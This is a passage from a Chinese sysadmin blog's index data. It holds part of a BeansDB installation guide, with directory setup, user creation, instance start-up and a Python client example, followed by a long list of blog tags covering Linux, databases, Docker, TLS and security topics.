&#x2F;usr&#x2F;local&#x2F;beansdb&#x2F;bin&#x2F;* .&#x2F; #命令软链beansdb -h #获取帮助 快速开始 1源码目录：&#x2F;root&#x2F;beansdb-master&#x2F;python中自带测试代码文件 dbclient.py 12345678通过该文件可以分析出dbclient.py的文件结构：dbclient.py文件的最顶层包含：fnv1a：一个哈希函数。MCStore：memcache客户端的封装。WriteFailedError：自定义的异常类。Beansdb：Beansdb客户端类。 12345678910mkdir &#x2F;data&#x2F;beansdb -p #创建beansdb数据存储目录mkdir &#x2F;usr&#x2F;local&#x2F;beansdb&#x2F;etc -p mkdir &#x2F;var&#x2F;run&#x2F;beansdb -pmkdir &#x2F;var&#x2F;log&#x2F;beansdb -puseradd beansdb -s &#x2F;sbin&#x2F;nologin -Mchown -R beansdb.beansdb &#x2F;var&#x2F;log&#x2F;beansdbchown beansdb.beansdb &#x2F;var&#x2F;log&#x2F;beansdb&#x2F;beansdb.log#启动实例beansdb -d -p 7900 -l 10.0.10.25 -H &#x2F;data&#x2F;beansdb -P &#x2F;var&#x2F;run&#x2F;beansdb&#x2F;beansdb.pid -L &#x2F;var&#x2F;log&#x2F;beansdb&#x2F;beansdb.log -T 2 官方example配置 1234567891011121314from dbclient import Beansdb# three beansdb nodes on localhostBEANSDBCFG &#x3D; &#123; &quot;localhost:7901&quot;: range(16), &quot;localhost:7902&quot;: range(16), &quot;localhost:7903&quot;: range(16),&#125;db &#x3D; Beansdb(BEANSDBCFG, 16)db.set(&#39;hello&#39;, &#39;world&#39;)db.get(&#39;hello&#39;)db.delete(&#39;hello&#39;) 12345678910111213141516171819翻译过来就是localhost:7901:1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1localhost:7902:1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1localhost:7903:1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1客户端拿到这个配置，会做一下“倒排”,即0：localhost:7901；localhost:7902；localhost:79031：localhost:7901；localhost:7902；localhost:79032：localhost:7901；localhost:7902；localhost:7903............15：localhost:7901；localhost:7902；localhost:7903","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"BeansDB","slug":"BeansDB","permalink":"https://garywu520.github.io/tags/BeansDB/"},{"name":"NoSQL","slug":"NoSQL","permalink":"https://garywu520.github.io/tags/NoSQL/"},{"name":"Key/Value","slug":"Key-Value","permalink":"https://garywu520.github.io/tags/Key-Value/"},{"name":"图片存储","slug":"图片存储","permalink":"https://garywu520.github.io/tags/%E5%9B%BE%E7%89%87%E5%AD%98%E5%82%A8/"}]}],"categories":[],"tags":[{"name":"openvpn","slug":"openvpn","permalink":"https://garywu520.github.io/tags/openvpn/"},{"name":"TUN","slug":"TUN","permalink":"https://garywu520.github.io/tags/TUN/"},{"name":"TAP","slug":"TAP","permalink":"https://garywu520.github.io/tags/TAP/"},{"name":"route","slug":"route","permalink":"https://garywu520.github.io/tags/route/"},{"name":"swap","slug":"swap","permalink":"https://garywu520.github.io/tags/swap/"},{"name":"虚拟内存","slug":"虚拟内存","permalink":"https://garywu520.github.io/tags/%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98/"},{"name":"swapon","slug":"swapon","permalink":"https://garywu520.github.io/tags/swapon/"},{"name":"swapoff","slug":"swapoff","permalink":"https://garywu520.github.io/tags/swapoff/"},{"name":"nginx","slug":"nginx","permalink":"https://garywu520.github.io/tags/nginx/"},{"name":"TLS","slug":"TLS","permalink":"https://garywu520.github.io/tags/TLS/"},{"name":"TLS1.3","slug":"TLS1-3","permalink":"https://garywu520.github.io/tags/TLS1-3/"},{"name":"BTC","slug":"BTC","permalink":"https://garywu520.github.io/tags/BTC/"},{"name":"coinmon","slug":"coinmon","permalink":"https://garywu520.github.io/tags/coinmon/"},{"name":"ETH","slug":"ETH","permalink":"https://garywu520.github.io/tags/ETH/"},{"name":"S3","slug":"S3","permalink":"https://garywu520.github.io/tags/S3/"},{"name":"AWS","slug":"AWS","permalink":"https://garywu520.github.io/tags/AWS/"},{"name":"对象存储","slug":"对象存储","permalink":"https://garywu520.github.io/tags/%E5%AF%B9%E8%B1%A1%E5%AD%98%E5%82%A8/"},{"name":"zabbix","slug":"zabbix","permalink":"https://garywu520.github.io/tags/zabbix/"},{"name":"数字货币","slug":"数字货币","permalink":"https://garywu520.github.io/tags/%E6%95%B0%E5%AD%97%E8%B4%A7%E5%B8%81/"},{"name":"交易所","slug":"交易所","permalink":"https://garywu520.github.io/tags/%E4%BA%A4%E6%98%93%E6%89%80/"},{"name":"mysql数据库差异化比对","slug":"mysql数据库差异化比对","permalink":"https://garywu520.github.io/tags/mysql%E6%95%B0%E6%8D%AE%E5%BA%93%E5%B7%AE%E5%BC%82%E5%8C%96%E6%AF%94%E5%AF%B9/"},{"name":"mysqldiff","slug":"mysqldiff","permalink":"https://garywu520.github.io/tags/mysqldiff/"},{"name":"Android","slug":"Android","permalink":"https://garywu520.github.io/tags/Android/"},{"name":"IOS","slug":"IOS","permalink":"https://garywu520.github.io/tags/IOS/"},{"name":"atxserver","slug":"atxserver","permalink":"https://garywu520.github.io/tags/atxserver/"},{"name":"atxserver2","slug":"atxserver2","permalink":"https://garywu520.github.io/tags/atxserver2/"},{"name":"测试平台","slug":"测试平台","permalink":"https://garywu520.github.io/tags/%E6%B5%8B%E8%AF%95%E5%B9%B3%E5%8F%B0/"},{"name":"监控","slug":"监控","permalink":"https://garywu520.github.io/tags/%E7%9B%91%E6%8E%A7/"},{"name":"MySQL","slug":"MySQL","permalink":"https://garywu520.github.io/tags/MySQL/"},{"name":"monitor","slug":"monitor","permalink":"https://garywu520.github.io/tags/monitor/"},{"name":"ansible","slug":"ansible","permalink":"https://garywu520.github.io/tags/ansible/"},{"name":"windows","slug":"windows","permalink":"https://garywu520.github.io/tags/windows/"},{"name":"自动化","slug":"自动化","permalink":"https://garywu520.github.io/tags/%E8%87%AA%E5%8A%A8%E5%8C%96/"},{"name":"cmd","slug":"cmd","permalink":"https://garywu520.github.io/tags/cmd/"},{"name":"powershell","slug":"powershell","permalink":"https://garywu520.github.io/tags/powershell/"},{"name":"rd","slug":"rd","permalink":"https://garywu520.github.io/tags/rd/"},{"name":"rmdir","slug":"rmdir","permalink":"https://garywu520.github.io/tags/rmdir/"},{"name":"nodejs","slug":"nodejs","permalink":"https://garywu520.github.io/tags/nodejs/"},{"name":"supervisor","slug":"supervisor","permalink":"https://garywu520.github.io/tags/supervisor/"},{"name":"pm2","slug":"pm2","permalink":"https://garywu520.github.io/tags/pm2/"},{"name":"win进程管理","slug":"win进程管理","permalink":"https://garywu520.github.io/tags/win%E8%BF%9B%E7%A8%8B%E7%AE%A1%E7%90%86/"},{"name":"Ansible自动化","slug":"Ansible自动化","permalink":"https://garywu520.github.io/tags/Ansible%E8%87%AA%E5%8A%A8%E5%8C%96/"},{"name":"htop","slug":"htop","permalink":"https://garywu520.github.io/tags/htop/"},{"name":"htop3","slug":"htop3","permalink":"https://garywu520.github.io/tags/htop3/"},{"name":"mysql","slug":"mysql","permalink":"https://garywu520.github.io/tags/mysql/"},{"name":"ESXI","slug":"ESXI","permalink":"https://garywu520.github.io/tags/ESXI/"},{"name":"openwrt","slug":"openwrt","permalink":"https://garywu520.github.io/tags/openwrt/"},{"name":"overlay扩容","slug":"overlay扩容","permalink":"https://garywu520.github.io/tags/overlay%E6%89%A9%E5%AE%B9/"},{"name":"扩容","slug":"扩容","permalink":"https://garywu520.github.io/tags/%E6%89%A9%E5%AE%B9/"},{"name":"unix","slug":"unix","permalink":"https://garywu520.github.io/tags/unix/"},{"name":"分区","slug":"分区","permalink":"https://garywu520.github.io/tags/%E5%88%86%E5%8C%BA/"},{"name":"IMG","slug":"IMG","permalink":"https://garywu520.github.io/tags/IMG/"},{"name":"crt","slug":"crt","permalink":"https://garywu520.github.io/tags/crt/"},{"name":"pfx","slug":"pfx","permalink":"https://garywu520.github.io/tags/pfx/"},{"name":"ssl","slug":"ssl","permalink":"https://garywu520.github.io/tags/ssl/"},{"name":"mysqldump","slug":"mysqldump","permalink":"https://garywu520.github.io/tags/mysqldump/"},{"name":"bat","slug":"bat","permalink":"https://garywu520.github.io/tags/bat/"},{"name":"jumpserver","slug":"jumpserver","permalink":"https://garywu520.github.io/tags/jumpserver/"},{"name":"koko","slug":"koko","permalink":"https://garywu520.github.io/tags/koko/"},{"name":"ca","slug":"ca","permalink":"https://garywu520.github.io/tags/ca/"},{"name":"ECC","slug":"ECC","permalink":"https://garywu520.github.io/tags/ECC/"},{"name":"key","slug":"key","permalink":"https://garywu520.github.io/tags/key/"},{"name":"RSA","slug":"RSA","permalink":"https://garywu520.github.io/tags/RSA/"},{"name":"secp256k1","slug":"secp256k1","permalink":"https://garywu520.github.io/tags/secp256k1/"},{"name":"prime256v1","slug":"prime256v1","permalink":"https://garywu520.github.io/tags/prime256v1/"},{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"ps","slug":"ps","permalink":"https://garywu520.github.io/tags/ps/"},{"name":"strace","slug":"strace","permalink":"https://garywu520.github.io/tags/strace/"},{"name":"pid","slug":"pid","permalink":"https://garywu520.github.io/tags/pid/"},{"name":"linux","slug":"linux","permalink":"https://garywu520.github.io/tags/linux/"},{"name":"busybox","slug":"busybox","permalink":"https://garywu520.github.io/tags/busybox/"},{"name":"tools","slug":"tools","permalink":"https://garywu520.github.io/tags/tools/"},{"name":"so","slug":"so","permalink":"https://garywu520.github.io/tags/so/"},{"name":"共享库","slug":"共享库","permalink":"https://garywu520.github.io/tags/%E5%85%B1%E4%BA%AB%E5%BA%93/"},{"name":"rookit","slug":"rookit","permalink":"https://garywu520.github.io/tags/rookit/"},{"name":"木马防御","slug":"木马防御","permalink":"https://garywu520.github.io/tags/%E6%9C%A8%E9%A9%AC%E9%98%B2%E5%BE%A1/"},{"name":"启动项","slug":"启动项","permalink":"https://garywu520.github.io/tags/%E5%90%AF%E5%8A%A8%E9%A1%B9/"},{"name":"进程管理","slug":"进程管理","permalink":"https://garywu520.github.io/tags/%E8%BF%9B%E7%A8%8B%E7%AE%A1%E7%90%86/"},{"name":"软路由","slug":"软路由","permalink":"https://garywu520.github.io/tags/%E8%BD%AF%E8%B7%AF%E7%94%B1/"},{"name":"Relay协议","slug":"Relay协议","permalink":"https://garywu520.github.io/tags/Relay%E5%8D%8F%E8%AE%AE/"},{"name":"Relay","slug":"Relay","permalink":"https://garywu520.github.io/tags/Relay/"},{"name":"TCP/UDP","slug":"TCP-UDP","permalink":"https://garywu520.github.io/tags/TCP-UDP/"},{"name":"端口转发","slug":"端口转发","permalink":"https://garywu520.github.io/tags/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/"},{"name":"TLS加密转发","slug":"TLS加密转发","permalink":"https://garywu520.github.io/tags/TLS%E5%8A%A0%E5%AF%86%E8%BD%AC%E5%8F%91/"},{"name":"socat","slug":"socat","permalink":"https://garywu520.github.io/tags/socat/"},{"name":"gost","slug":"gost","permalink":"https://garywu520.github.io/tags/gost/"},{"name":"端口穿透","slug":"端口穿透","permalink":"https://garywu520.github.io/tags/%E7%AB%AF%E5%8F%A3%E7%A9%BF%E9%80%8F/"},{"name":"攻击","slug":"攻击","permalink":"https://garywu520.github.io/tags/%E6%94%BB%E5%87%BB/"},{"name":"防御","slug":"防御","permalink":"https://garywu520.github.io/tags/%E9%98%B2%E5%BE%A1/"},{"name":"反弹shell","slug":"反弹shell","permalink":"https://garywu520.github.io/tags/%E5%8F%8D%E5%BC%B9shell/"},{"name":"渗透","slug":"渗透","permalink":"https://garywu520.github.io/tags/%E6%B8%97%E9%80%8F/"},{"name":"chattr","slug":"chattr","permalink":"https://garywu520.github.io/tags/chattr/"},{"name":"lsattr","slug":"lsattr","permalink":"https://garywu520.github.io/tags/lsattr/"},{"name":"weather","slug":"weather","permalink":"https://garywu520.github.io/tags/weather/"},{"name":"wttr.in","slug":"wttr-in","permalink":"https://garywu520.github.io/tags/wttr-in/"},{"name":"以太坊","slug":"以太坊","permalink":"https://garywu520.github.io/tags/%E4%BB%A5%E5%A4%AA%E5%9D%8A/"},{"name":"TMOUT","slug":"TMOUT","permalink":"https://garywu520.github.io/tags/TMOUT/"},{"name":"登录用户","slug":"登录用户","permalink":"https://garywu520.github.io/tags/%E7%99%BB%E5%BD%95%E7%94%A8%E6%88%B7/"},{"name":"用户注销","slug":"用户注销","permalink":"https://garywu520.github.io/tags/%E7%94%A8%E6%88%B7%E6%B3%A8%E9%94%80/"},{"name":"SSH","slug":"SSH","permalink":"https://garywu520.github.io/tags/SSH/"},{"name":"Google","slug":"Google","permalink":"https://garywu520.github.io/tags/Google/"},{"name":"MFA","slug":"MFA","permalink":"https://garywu520.github.io/tags/MFA/"},{"name":"二次认证","slug":"二次认证","permalink":"https://garywu520.github.io/tags/%E4%BA%8C%E6%AC%A1%E8%AE%A4%E8%AF%81/"},{"name":"zabbix 断图","slug":"zabbix-断图","permalink":"https://garywu520.github.io/tags/zabbix-%E6%96%AD%E5%9B%BE/"},{"name":"docker","slug":"docker","permalink":"https://garywu520.github.io/tags/docker/"},{"name":"自动发现","slug":"自动发现","permalink":"https://garywu520.github.io/tags/%E8%87%AA%E5%8A%A8%E5%8F%91%E7%8E%B0/"},{"name":"docker监控","slug":"docker监控","permalink":"https://garywu520.github.io/tags/docker%E7%9B%91%E6%8E%A7/"},{"name":"docker日志","slug":"docker日志","permalink":"https://garywu520.github.io/tags/docker%E6%97%A5%E5%BF%97/"},{"name":"docker日志清理","slug":"docker日志清理","permalink":"https://garywu520.github.io/tags/docker%E6%97%A5%E5%BF%97%E6%B8%85%E7%90%86/"},{"name":"top","slug":"top","permalink":"https://garywu520.github.io/tags/top/"},{"name":"ctop","slug":"ctop","permalink":"https://garywu520.github.io/tags/ctop/"},{"name":"nacos","slug":"nacos","permalink":"https://garywu520.github.io/tags/nacos/"},{"name":"docker-compose","slug":"docker-compose","permalink":"https://garywu520.github.io/tags/docker-compose/"},{"name":"docker ip","slug":"docker-ip","permalink":"https://garywu520.github.io/tags/docker-ip/"},{"name":"ip","slug":"ip","permalink":"https://garywu520.github.io/tags/ip/"},{"name":"MySQL主从","slug":"MySQL主从","permalink":"https://garywu520.github.io/tags/MySQL%E4%B8%BB%E4%BB%8E/"},{"name":"Docker","slug":"Docker","permalink":"https://garywu520.github.io/tags/Docker/"},{"name":"固定IP","slug":"固定IP","permalink":"https://garywu520.github.io/tags/%E5%9B%BA%E5%AE%9AIP/"},{"name":"Nginx","slug":"Nginx","permalink":"https://garywu520.github.io/tags/Nginx/"},{"name":"CDN","slug":"CDN","permalink":"https://garywu520.github.io/tags/CDN/"},{"name":"IP","slug":"IP","permalink":"https://garywu520.github.io/tags/IP/"},{"name":"seafile","slug":"seafile","permalink":"https://garywu520.github.io/tags/seafile/"},{"name":"持久化","slug":"持久化","permalink":"https://garywu520.github.io/tags/%E6%8C%81%E4%B9%85%E5%8C%96/"},{"name":"zookeeper","slug":"zookeeper","permalink":"https://garywu520.github.io/tags/zookeeper/"},{"name":"zk","slug":"zk","permalink":"https://garywu520.github.io/tags/zk/"},{"name":"ACL","slug":"ACL","permalink":"https://garywu520.github.io/tags/ACL/"},{"name":"阿里云","slug":"阿里云","permalink":"https://garywu520.github.io/tags/%E9%98%BF%E9%87%8C%E4%BA%91/"},{"name":"镜像仓库","slug":"镜像仓库","permalink":"https://garywu520.github.io/tags/%E9%95%9C%E5%83%8F%E4%BB%93%E5%BA%93/"},{"name":"maven","slug":"maven","permalink":"https://garywu520.github.io/tags/maven/"},{"name":"nexus3","slug":"nexus3","permalink":"https://garywu520.github.io/tags/nexus3/"},{"name":"logs","slug":"logs","permalink":"https://garywu520.github.io/tags/logs/"},{"name":"日志收集","slug":"日志收集","permalink":"https://garywu520.github.io/tags/%E6%97%A5%E5%BF%97%E6%94%B6%E9%9B%86/"},{"name":"centos7","slug":"centos7","permalink":"https://garywu520.github.io/tags/centos7/"},{"name":"yum","slug":"yum","permalink":"https://garywu520.github.io/tags/yum/"},{"name":"iptables","slug":"iptables","permalink":"https://garywu520.github.io/tags/iptables/"},{"name":"postman","slug":"postman","permalink":"https://garywu520.github.io/tags/postman/"},{"name":"postwoman","slug":"postwoman","permalink":"https://garywu520.github.io/tags/postwoman/"},{"name":"API","slug":"API","permalink":"https://garywu520.github.io/tags/API/"},{"name":"接口测试","slug":"接口测试","permalink":"https://garywu520.github.io/tags/%E6%8E%A5%E5%8F%A3%E6%B5%8B%E8%AF%95/"},{"name":"Dockerfile","slug":"Dockerfile","permalink":"https://garywu520.github.io/tags/Dockerfile/"},{"name":"harbor","slug":"harbor","permalink":"https://garywu520.github.io/tags/harbor/"},{"name":"wiki","slug":"wiki","permalink":"https://garywu520.github.io/tags/wiki/"},{"name":"XWiki","slug":"XWiki","permalink":"https://garywu520.github.io/tags/XWiki/"},{"name":"开源wiki","slug":"开源wiki","permalink":"https://garywu520.github.io/tags/%E5%BC%80%E6%BA%90wiki/"},{"name":"DNS","slug":"DNS","permalink":"https://garywu520.github.io/tags/DNS/"},{"name":"SSL","slug":"SSL","permalink":"https://garywu520.github.io/tags/SSL/"},{"name":"DoT","slug":"DoT","permalink":"https://garywu520.github.io/tags/DoT/"},{"name":"DoH","slug":"DoH","permalink":"https://garywu520.github.io/tags/DoH/"},{"name":"https","slug":"https","permalink":"https://garywu520.github.io/tags/https/"},{"name":"openssl","slug":"openssl","permalink":"https://garywu520.github.io/tags/openssl/"},{"name":"eccdsa","slug":"eccdsa","permalink":"https://garywu520.github.io/tags/eccdsa/"},{"name":"websocket","slug":"websocket","permalink":"https://garywu520.github.io/tags/websocket/"},{"name":"ws","slug":"ws","permalink":"https://garywu520.github.io/tags/ws/"},{"name":"wss","slug":"wss","permalink":"https://garywu520.github.io/tags/wss/"},{"name":"wscat","slug":"wscat","permalink":"https://garywu520.github.io/tags/wscat/"},{"name":"HTTPS","slug":"HTTPS","permalink":"https://garywu520.github.io/tags/HTTPS/"},{"name":"HTTP","slug":"HTTP","permalink":"https://garywu520.github.io/tags/HTTP/"},{"name":"http1.1","slug":"http1-1","permalink":"https://garywu520.github.io/tags/http1-1/"},{"name":"http2","slug":"http2","permalink":"https://garywu520.github.io/tags/http2/"},{"name":"mail","slug":"mail","permalink":"https://garywu520.github.io/tags/mail/"},{"name":"zimbra","slug":"zimbra","permalink":"https://garywu520.github.io/tags/zimbra/"},{"name":"邮件服务器","slug":"邮件服务器","permalink":"https://garywu520.github.io/tags/%E9%82%AE%E4%BB%B6%E6%9C%8D%E5%8A%A1%E5%99%A8/"},{"name":"ZCS","slug":"ZCS","permalink":"https://garywu520.github.io/tags/ZCS/"},{"name":"redis key清理","slug":"redis-key清理","permalink":"https://garywu520.github.io/tags/redis-key%E6%B8%85%E7%90%86/"},{"name":"清理","slug":"清理","permalink":"https://garywu520.github.io/tags/%E6%B8%85%E7%90%86/"},{"name":"zabbix server","slug":"zabbix-server","permalink":"https://garywu520.github.io/tags/zabbix-server/"},{"name":"zabbix agent","slug":"zabbix-agent","permalink":"https://garywu520.github.io/tags/zabbix-agent/"},{"name":"表缓存","slug":"表缓存","permalink":"https://garywu520.github.io/tags/%E8%A1%A8%E7%BC%93%E5%AD%98/"},{"name":"查询缓存","slug":"查询缓存","permalink":"https://garywu520.github.io/tags/%E6%9F%A5%E8%AF%A2%E7%BC%93%E5%AD%98/"},{"name":"table_open_cache","slug":"table-open-cache","permalink":"https://garywu520.github.io/tags/table-open-cache/"},{"name":"query_cache","slug":"query-cache","permalink":"https://garywu520.github.io/tags/query-cache/"},{"name":"pem","slug":"pem","permalink":"https://garywu520.github.io/tags/pem/"},{"name":"证书","slug":"证书","permalink":"https://garywu520.github.io/tags/%E8%AF%81%E4%B9%A6/"},{"name":"acme.sh","slug":"acme-sh","permalink":"https://garywu520.github.io/tags/acme-sh/"},{"name":"dhparam.pem","slug":"dhparam-pem","permalink":"https://garywu520.github.io/tags/dhparam-pem/"},{"name":"letsencrypt","slug":"letsencrypt","permalink":"https://garywu520.github.io/tags/letsencrypt/"},{"name":"Keepalive","slug":"Keepalive","permalink":"https://garywu520.github.io/tags/Keepalive/"},{"name":"sshd","slug":"sshd","permalink":"https://garywu520.github.io/tags/sshd/"},{"name":"bash","slug":"bash","permalink":"https://garywu520.github.io/tags/bash/"},{"name":"OpenResty","slug":"OpenResty","permalink":"https://garywu520.github.io/tags/OpenResty/"},{"name":"Lua","slug":"Lua","permalink":"https://garywu520.github.io/tags/Lua/"},{"name":"WAF","slug":"WAF","permalink":"https://garywu520.github.io/tags/WAF/"},{"name":"防火墙","slug":"防火墙","permalink":"https://garywu520.github.io/tags/%E9%98%B2%E7%81%AB%E5%A2%99/"},{"name":"应用防火墙","slug":"应用防火墙","permalink":"https://garywu520.github.io/tags/%E5%BA%94%E7%94%A8%E9%98%B2%E7%81%AB%E5%A2%99/"},{"name":"Iptables","slug":"Iptables","permalink":"https://garywu520.github.io/tags/Iptables/"},{"name":"innode","slug":"innode","permalink":"https://garywu520.github.io/tags/innode/"},{"name":"spool","slug":"spool","permalink":"https://garywu520.github.io/tags/spool/"},{"name":"maildrop","slug":"maildrop","permalink":"https://garywu520.github.io/tags/maildrop/"},{"name":"pt-query-digest","slug":"pt-query-digest","permalink":"https://garywu520.github.io/tags/pt-query-digest/"},{"name":"慢查询","slug":"慢查询","permalink":"https://garywu520.github.io/tags/%E6%85%A2%E6%9F%A5%E8%AF%A2/"},{"name":"分析","slug":"分析","permalink":"https://garywu520.github.io/tags/%E5%88%86%E6%9E%90/"},{"name":"PHP","slug":"PHP","permalink":"https://garywu520.github.io/tags/PHP/"},{"name":"mcrypt","slug":"mcrypt","permalink":"https://garywu520.github.io/tags/mcrypt/"},{"name":"extension","slug":"extension","permalink":"https://garywu520.github.io/tags/extension/"},{"name":"Redis","slug":"Redis","permalink":"https://garywu520.github.io/tags/Redis/"},{"name":"RDB","slug":"RDB","permalink":"https://garywu520.github.io/tags/RDB/"},{"name":"rdb备份恢复","slug":"rdb备份恢复","permalink":"https://garywu520.github.io/tags/rdb%E5%A4%87%E4%BB%BD%E6%81%A2%E5%A4%8D/"},{"name":"redis","slug":"redis","permalink":"https://garywu520.github.io/tags/redis/"},{"name":"shell","slug":"shell","permalink":"https://garywu520.github.io/tags/shell/"},{"name":"php","slug":"php","permalink":"https://garywu520.github.io/tags/php/"},{"name":"nmap","slug":"nmap","permalink":"https://garywu520.github.io/tags/nmap/"},{"name":"sentinel","slug":"sentinel","permalink":"https://garywu520.github.io/tags/sentinel/"},{"name":"redis主从","slug":"redis主从","permalink":"https://garywu520.github.io/tags/redis%E4%B8%BB%E4%BB%8E/"},{"name":"haproxy","slug":"haproxy","permalink":"https://garywu520.github.io/tags/haproxy/"},{"name":"expire","slug":"expire","permalink":"https://garywu520.github.io/tags/expire/"},{"name":"过期时间","slug":"过期时间","permalink":"https://garywu520.github.io/tags/%E8%BF%87%E6%9C%9F%E6%97%B6%E9%97%B4/"},{"name":"CONFIG","slug":"CONFIG","permalink":"https://garywu520.github.io/tags/CONFIG/"},{"name":"sftp","slug":"sftp","permalink":"https://garywu520.github.io/tags/sftp/"},{"name":"lrzsz","slug":"lrzsz","permalink":"https://garywu520.github.io/tags/lrzsz/"},{"name":"mac","slug":"mac","permalink":"https://garywu520.github.io/tags/mac/"},{"name":"上传下载","slug":"上传下载","permalink":"https://garywu520.github.io/tags/%E4%B8%8A%E4%BC%A0%E4%B8%8B%E8%BD%BD/"},{"name":"ssh","slug":"ssh","permalink":"https://garywu520.github.io/tags/ssh/"},{"name":"xshell","slug":"xshell","permalink":"https://garywu520.github.io/tags/xshell/"},{"name":"10053","slug":"10053","permalink":"https://garywu520.github.io/tags/10053/"},{"name":"301","slug":"301","permalink":"https://garywu520.github.io/tags/301/"},{"name":"GET","slug":"GET","permalink":"https://garywu520.github.io/tags/GET/"},{"name":"POST","slug":"POST","permalink":"https://garywu520.github.io/tags/POST/"},{"name":"307","slug":"307","permalink":"https://garywu520.github.io/tags/307/"},{"name":"tomcat","slug":"tomcat","permalink":"https://garywu520.github.io/tags/tomcat/"},{"name":"jvm","slug":"jvm","permalink":"https://garywu520.github.io/tags/jvm/"},{"name":"jps","slug":"jps","permalink":"https://garywu520.github.io/tags/jps/"},{"name":"内存","slug":"内存","permalink":"https://garywu520.github.io/tags/%E5%86%85%E5%AD%98/"},{"name":"nginx下载","slug":"nginx下载","permalink":"https://garywu520.github.io/tags/nginx%E4%B8%8B%E8%BD%BD/"},{"name":"MTR","slug":"MTR","permalink":"https://garywu520.github.io/tags/MTR/"},{"name":"traceroute","slug":"traceroute","permalink":"https://garywu520.github.io/tags/traceroute/"},{"name":"besttrace","slug":"besttrace","permalink":"https://garywu520.github.io/tags/besttrace/"},{"name":"报警","slug":"报警","permalink":"https://garywu520.github.io/tags/%E6%8A%A5%E8%AD%A6/"},{"name":"supervisorctl","slug":"supervisorctl","permalink":"https://garywu520.github.io/tags/supervisorctl/"},{"name":"supervisord","slug":"supervisord","permalink":"https://garywu520.github.io/tags/supervisord/"},{"name":"二进制","slug":"二进制","permalink":"https://garywu520.github.io/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6/"},{"name":"images","slug":"images","permalink":"https://garywu520.github.io/tags/images/"},{"name":"导入导出","slug":"导入导出","permalink":"https://garywu520.github.io/tags/%E5%AF%BC%E5%85%A5%E5%AF%BC%E5%87%BA/"},{"name":"tomcat8","slug":"tomcat8","permalink":"https://garywu520.github.io/tags/tomcat8/"},{"name":"tomcat多实例","slug":"tomcat多实例","permalink":"https://garywu520.github.io/tags/tomcat%E5%A4%9A%E5%AE%9E%E4%BE%8B/"},{"name":"jdk","slug":"jdk","permalink":"https://garywu520.github.io/tags/jdk/"},{"name":"jar","slug":"jar","permalink":"https://garywu520.github.io/tags/jar/"},{"name":"war","slug":"war","permalink":"https://garywu520.github.io/tags/war/"},{"name":"catalina","slug":"catalina","permalink":"https://garywu520.github.io/tags/catalina/"},{"name":"日志log","slug":"日志log","permalink":"https://garywu520.github.io/tags/%E6%97%A5%E5%BF%97log/"},{"name":"java","slug":"java","permalink":"https://garywu520.github.io/tags/java/"},{"name":"docker-ce","slug":"docker-ce","permalink":"https://garywu520.github.io/tags/docker-ce/"},{"name":"容器","slug":"容器","permalink":"https://garywu520.github.io/tags/%E5%AE%B9%E5%99%A8/"},{"name":"docker-compass","slug":"docker-compass","permalink":"https://garywu520.github.io/tags/docker-compass/"},{"name":"su","slug":"su","permalink":"https://garywu520.github.io/tags/su/"},{"name":"sudo","slug":"sudo","permalink":"https://garywu520.github.io/tags/sudo/"},{"name":"hadoop","slug":"hadoop","permalink":"https://garywu520.github.io/tags/hadoop/"},{"name":"hdfs","slug":"hdfs","permalink":"https://garywu520.github.io/tags/hdfs/"},{"name":"ELK","slug":"ELK","permalink":"https://garywu520.github.io/tags/ELK/"},{"name":"logstash","slug":"logstash","permalink":"https://garywu520.github.io/tags/logstash/"},{"name":"Plugin","slug":"Plugin","permalink":"https://garywu520.github.io/tags/Plugin/"},{"name":"YAML","slug":"YAML","permalink":"https://garywu520.github.io/tags/YAML/"},{"name":"Ruby","slug":"Ruby","permalink":"https://garywu520.github.io/tags/Ruby/"},{"name":"Gem镜像","slug":"Gem镜像","permalink":"https://garywu520.github.io/tags/Gem%E9%95%9C%E5%83%8F/"},{"name":"rootkit","slug":"rootkit","permalink":"https://garywu520.github.io/tags/rootkit/"},{"name":"chkrootkit","slug":"chkrootkit","permalink":"https://garywu520.github.io/tags/chkrootkit/"},{"name":"rkhunter","slug":"rkhunter","permalink":"https://garywu520.github.io/tags/rkhunter/"},{"name":"rootkit hunter","slug":"rootkit-hunter","permalink":"https://garywu520.github.io/tags/rootkit-hunter/"},{"name":"入侵","slug":"入侵","permalink":"https://garywu520.github.io/tags/%E5%85%A5%E4%BE%B5/"},{"name":"肉鸡","slug":"肉鸡","permalink":"https://garywu520.github.io/tags/%E8%82%89%E9%B8%A1/"},{"name":"rootkit攻击","slug":"rootkit攻击","permalink":"https://garywu520.github.io/tags/rootkit%E6%94%BB%E5%87%BB/"},{"name":"Linux","slug":"Linux","permalink":"https://garywu520.github.io/tags/Linux/"},{"name":"history","slug":"history","permalink":"https://garywu520.github.io/tags/history/"},{"name":"系统安全","slug":"系统安全","permalink":"https://garywu520.github.io/tags/%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/"},{"name":"随笔","slug":"随笔","permalink":"https://garywu520.github.io/tags/%E9%9A%8F%E7%AC%94/"},{"name":"邓宁","slug":"邓宁","permalink":"https://garywu520.github.io/tags/%E9%82%93%E5%AE%81/"},{"name":"克鲁格效应","slug":"克鲁格效应","permalink":"https://garywu520.github.io/tags/%E5%85%8B%E9%B2%81%E6%A0%BC%E6%95%88%E5%BA%94/"},{"name":"VM","slug":"VM","permalink":"https://garywu520.github.io/tags/VM/"},{"name":"虚拟机","slug":"虚拟机","permalink":"https://garywu520.github.io/tags/%E8%99%9A%E6%8B%9F%E6%9C%BA/"},{"name":"虚拟化","slug":"虚拟化","permalink":"https://garywu520.github.io/tags/%E8%99%9A%E6%8B%9F%E5%8C%96/"},{"name":"elasticsearch","slug":"elasticsearch","permalink":"https://garywu520.github.io/tags/elasticsearch/"},{"name":"ES","slug":"ES","permalink":"https://garywu520.github.io/tags/ES/"},{"name":"shard","slug":"shard","permalink":"https://garywu520.github.io/tags/shard/"},{"name":"reshard","slug":"reshard","permalink":"https://garywu520.github.io/tags/reshard/"},{"name":"es","slug":"es","permalink":"https://garywu520.github.io/tags/es/"},{"name"